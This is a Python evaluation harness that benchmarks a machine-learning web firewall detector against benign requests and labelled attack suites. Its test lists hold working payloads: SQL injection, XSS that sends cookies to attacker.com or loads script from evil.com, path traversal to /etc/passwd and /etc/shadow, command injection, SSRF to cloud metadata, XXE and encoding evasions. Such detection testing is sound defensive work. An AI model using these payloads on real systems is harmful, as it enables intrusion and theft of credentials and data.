"""
WAF ML Anomaly Detector Evaluation & Benchmarking Harness.

Evaluates the trained ML model against unseen benign traffic and realistic
attack suites (SQLi, XSS, Traversal, CMDi, SSRF, and Obfuscation Evasion).
Computes precision, recall, false positive rates, and latency profiles.
"""

import os
import sys
import time
from typing import Dict, List
import numpy as np

# Handle path resolution
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
WAF_ROOT = os.path.dirname(CURRENT_DIR)
PROJECT_ROOT = os.path.dirname(WAF_ROOT)
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from waf.ml.detector import MLAnomalyDetector

# Unseen test suites to evaluate generalization
UNSEEN_BENIGN_TESTS = [
    {"path": "/products/search", "params": {"query": "wireless noise cancelling headphones", "page": "1"}},
    {"path": "/api/v2/articles", "params": {"tag": "cybersecurity", "sort": "date_desc"}},
    {"path": "/user/settings", "params": {"theme": "light", "notifications": "enabled"}},
    {"path": "/contact-us", "params": {"name": "Michael Scott", "email": "mscott@dundermifflin.com"}},
    {"path": "/cart/items", "body": '{"item_id": 9012, "quantity": 3, "color": "navy_blue"}'},
    {"path": "/catalog", "params": {"brand": "apple", "min_price": "200", "max_price": "1200"}},
    {"path": "/docs/getting-started.html", "params": {}},
    {"path": "/api/metrics", "params": {"start_time": "1710000000", "end_time": "1710086400"}},
    {"path": "/feedback", "body": "comments=I+really+enjoyed+the+interactive+interface.+Keep+it+up!"},
    {"path": "/blog/post/waf-architecture", "params": {"author": "arindam"}},
]

UNSEEN_SQLI_TESTS = [
    {"path": "/login", "params": {"user": "admin' OR 1=1--", "pass": "x"}},
    {"path": "/products", "params": {"id": "5 UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables"}},
    {"path": "/search", "params": {"q": "shoes' AND (SELECT * FROM (SELECT(SLEEP(4)))a)--"}},
    {"path": "/profile", "params": {"id": "-1' OR 3+2=5 AND '1'='1"}},
    {"path": "/api/query", "params": {"filter": "name'; DROP TABLE accounts;--"}},
    {"path": "/items", "params": {"category": "1' ORDER BY 1,2,3,4,5#"}},
    {"path": "/auth", "params": {"username": "admin'/**/OR/**/1=1#"}},
    {"path": "/users", "params": {"id": "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))"}},
]

UNSEEN_XSS_TESTS = [
    {"path": "/search", "params": {"q": "<script>alert('pwned')</script>"}},
    {"path": "/comments", "body": "msg=<img src=1 onerror=alert(document.cookie)>"},
    {"path": "/profile", "params": {"bio": "<svg/onload=fetch('http://attacker.com/?c='+document.cookie)>"}},
    {"path": "/feedback", "body": "note=\"><script src=http://evil.com/x.js></script>"},
    {"path": "/links", "params": {"redirect": "javascript:alert(window.origin)"}},
    {"path": "/render", "params": {"html": "<iframe src=\"javascript:alert(1)\"></iframe>"}},
    {"path": "/share", "params": {"url": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}},
]

UNSEEN_TRAVERSAL_TESTS = [
    {"path": "/download", "params": {"file": "../../../../etc/passwd"}},
    {"path": "/view", "params": {"page": "..\\..\\..\\..\\windows\\win.ini"}},
    {"path": "/include", "params": {"template": "..%2f..%2f..%2fetc%2fshadow"}},
    {"path": "/image", "params": {"img": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"}},
    {"path": "/read", "params": {"doc": "../../../../proc/self/environ"}},
    {"path": "/load", "params": {"name": "..%252f..%252f..%252fetc%252fpasswd"}},
]

UNSEEN_CMDI_TESTS = [
    {"path": "/ping", "params": {"ip": "127.0.0.1; cat /etc/passwd"}},
    {"path": "/dns", "params": {"host": "google.com | whoami"}},
    {"path": "/tools", "params": {"target": "localhost && id"}},
    {"path": "/backup", "params": {"name": "$(whoami)"}},
    {"path": "/exec", "params": {"cmd": "`id`"}},
    {"path": "/shell", "params": {"arg": "test | powershell -c \"Get-Process\""}},
]

UNSEEN_SSRF_XXE_TESTS = [
    {"path": "/proxy", "params": {"url": "http://169.254.169.254/latest/meta-data/"}},
    {"path": "/webhook", "params": {"endpoint": "http://metadata.google.internal/computeMetadata/v1/"}},
    {"path": "/fetch", "params": {"src": "file:///etc/passwd"}},
    {"path": "/api/xml", "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"},
]

UNSEEN_EVASION_TESTS = [
    {"path": "/search", "params": {"q": "%2527%2520OR%2520%25271%2527%253D%25271"}},  # Double URL-encoding
    {"path": "/view", "params": {"file": "....//....//....//etc/passwd"}},             # Filter bypass
    {"path": "/test", "params": {"q": "<sCrIpT>alert(1)</sCrIpT>"}},                   # Case variation
    {"path": "/login", "params": {"id": "1'/*comment*/UNION/*comment*/SELECT/*comment*/1,2--"}}, # SQL comment
    {"path": "/download", "params": {"path": "../../../../etc/passwd%00.jpg"}},         # Null-byte injection
]


def evaluate_category(detector: MLAnomalyDetector, tests: List[Dict], expected_malicious: bool) -> Dict:
    results = {"total": len(tests), "correct": 0, "incorrect": 0, "latencies": []}
    for item in tests:
        verdict = detector.inspect(item)
        results["latencies"].append(verdict.latency_ms)
        is_attack = verdict.is_anomaly
        if is_attack == expected_malicious:
            results["correct"] += 1
        else:
            results["incorrect"] += 1
    results["accuracy"] = results["correct"] / results["total"] if results["total"] > 0 else 0.0
    results["avg_latency_ms"] = float(np.mean(results["latencies"])) if results["latencies"] else 0.0
    return results


def run_full_evaluation():
    print("================================================================")
    print("      WAF MACHINE LEARNING ANOMALY DETECTOR BENCHMARK           ")
    print("================================================================\n")

    detector = MLAnomalyDetector()
    print(f"[*] Loaded model successfully from: {detector.model_path}")
    print(f"[*] Operating decision threshold:   {detector.threshold:.2f}")

    categories = [
        ("Benign Traffic", UNSEEN_BENIGN_TESTS, False),
        ("SQL Injection (SQLi)", UNSEEN_SQLI_TESTS, True),
        ("Cross-Site Scripting (XSS)", UNSEEN_XSS_TESTS, True),
        ("Path Traversal (LFI/RFI)", UNSEEN_TRAVERSAL_TESTS, True),
        ("Command Injection (CMDi)", UNSEEN_CMDI_TESTS, True),
        ("SSRF & XXE", UNSEEN_SSRF_XXE_TESTS, True),
        ("Obfuscated & Evasion", UNSEEN_EVASION_TESTS, True),
    ]

    total_samples = 0
    total_correct = 0
    all_latencies = []

    print("-" * 75)
    print(f"{'Category':<28} | {'Count':<6} | {'Accuracy':<10} | {'Avg Latency':<12} | {'Status'}")
    print("-" * 75)

    for cat_name, test_set, expected in categories:
        res = evaluate_category(detector, test_set, expected)
        total_samples += res["total"]
        total_correct += res["correct"]
        all_latencies.extend(res["latencies"])

        status = "PASSED" if res["accuracy"] >= 0.90 else "REVIEW"
        print(f"{cat_name:<28} | {res['total']:<6} | {res['accuracy'] * 100:6.1f}%   | {res['avg_latency_ms']:6.3f} ms   | {status}")

    overall_acc = total_correct / total_samples if total_samples > 0 else 0.0
    p50_latency = float(np.percentile(all_latencies, 50))
    p95_latency = float(np.percentile(all_latencies, 95))
    p99_latency = float(np.percentile(all_latencies, 99))

    print("-" * 75)
    print(f"Overall Test Accuracy:     {overall_acc * 100:.2f}% ({total_correct}/{total_samples})")
    print(f"Latency Percentiles:       p50: {p50_latency:.3f} ms | p95: {p95_latency:.3f} ms | p99: {p99_latency:.3f} ms")
    print("================================================================\n")

    # Interactive sample tests
    print("[*] Sample Inspections with Real-Time Explainability:\n")
    sample_tests = [
        ("Normal Search", {"path": "/search", "params": {"q": "blue running shoes", "page": "2"}}),
        ("SQLi Attempt", {"path": "/login", "params": {"username": "admin' OR '1'='1", "password": "x"}}),
        ("XSS Payload", {"path": "/guestbook", "body": "comment=<script>alert(document.cookie)</script>"}),
        ("Evasion Traversal", {"path": "/view", "params": {"file": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"}}),
    ]

    for label, sample in sample_tests:
        v = detector.inspect(sample)
        print(f"> Sample: {label}")
        print(f"  Path/Params: {sample.get('path')} | {sample.get('params') or sample.get('body')}")
        print(f"  Decision:    {v.decision} (Malicious Score: {v.score:.4f}, Latency: {v.latency_ms:.3f}ms)")
        if v.top_signals:
            print(f"  Signals:     {', '.join(v.top_signals)}")
        print()


if __name__ == "__main__":
    run_full_evaluation()
